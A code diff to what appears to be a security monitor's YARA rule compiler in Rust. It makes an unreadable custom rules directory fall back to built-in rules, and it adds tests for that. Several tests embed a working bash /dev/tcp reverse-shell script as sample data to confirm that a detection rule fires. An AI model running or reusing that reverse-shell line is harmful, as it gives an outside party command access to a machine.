@@ -20,16 +20,33 @@ pub fn compile(custom_rules_dir: Option<&Path>) -> Result<yara_x::Rules> {
     let mut contents: Vec<String> = Vec::new();
     if let Some(dir) = custom_rules_dir {
         if dir.is_dir() {
-            let entries = std::fs::read_dir(dir).with_context(|| format!("reading custom rules dir {}", dir.display()))?;
-            for entry in entries.flatten() {
-                let path = entry.path();
-                if path.extension().and_then(|e| e.to_str()) != Some("yar") {
-                    continue;
+            // Not `?`: a review found that an unreadable (not merely
+            // absent) custom rules directory - wrong permissions, an
+            // ACL denying this process, a mount gone stale - made this
+            // `Context`-wrapped error propagate all the way out of
+            // `compile`, which both the live monitor's startup and every
+            // on-demand `StartScan` call this same function to build
+            // their rule set. That took down the *entire* YARA module,
+            // built-in rules included, over a directory this feature
+            // never required to exist or be readable in the first place
+            // (`custom_rules_dir` is opt-in extra rules, not something
+            // the built-in set depends on). Degrading to builtin-only
+            // instead - logged loudly, but not fatal - matches how a
+            // missing directory is already handled just below.
+            match std::fs::read_dir(dir) {
+                Ok(entries) => {
+                    for entry in entries.flatten() {
+                        let path = entry.path();
+                        if path.extension().and_then(|e| e.to_str()) != Some("yar") {
+                            continue;
+                        }
+                        match std::fs::read_to_string(&path) {
+                            Ok(src) => contents.push(src),
+                            Err(e) => warn!(path = %path.display(), error = %e, "failed to read custom YARA rule file, skipping"),
+                        }
+                    }
                 }
-                match std::fs::read_to_string(&path) {
-                    Ok(src) => contents.push(src),
-                    Err(e) => warn!(path = %path.display(), error = %e, "failed to read custom YARA rule file, skipping"),
-                }
+                Err(e) => warn!(dir = %dir.display(), error = %e, "custom YARA rules dir exists but could not be read, falling back to built-in rules only"),
             }
         } else {
             warn!(dir = %dir.display(), "custom YARA rules dir does not exist, skipping");
@@ -103,5 +120,37 @@ mod tests {
         let mut script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n# ".to_vec();
         script.resize(70 * 1024, b'A');
         assert!(matched_rule_names(&rules, &script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
+    }
+
+    #[test]
+    fn nonexistent_custom_rules_dir_falls_back_to_builtin_only() {
+        let dir = std::env::temp_dir().join(format!("warden-yara-rules-test-missing-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let rules = compile(Some(&dir)).expect("a missing custom rules dir must not make compile() fail");
+        let script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n";
+        assert!(matched_rule_names(&rules, script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()), "builtin rules must still load");
+    }
+
+    #[test]
+    fn a_valid_custom_rule_file_loads_alongside_builtins() {
+        let dir = std::env::temp_dir().join(format!("warden-yara-rules-test-custom-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(
+            dir.join("custom.yar"),
+            "rule Custom_Canary { strings: $a = \"warden-custom-rule-canary\" condition: $a }",
+        )
+        .unwrap();
+        // A non-.yar file in the same directory must be ignored, not
+        // cause an error.
+        std::fs::write(dir.join("README.txt"), "not a rule file").unwrap();
+
+        let rules = compile(Some(&dir)).expect("a readable custom rules dir with a valid rule must compile");
+        assert!(matched_rule_names(&rules, b"warden-custom-rule-canary").contains(&"Custom_Canary".to_string()), "the custom rule must be loaded");
+        // Builtins must still be present alongside it.
+        let script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n";
+        assert!(matched_rule_names(&rules, script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()), "builtin rules must still load alongside custom ones");
+
+        std::fs::remove_dir_all(&dir).ok();
     }
 }
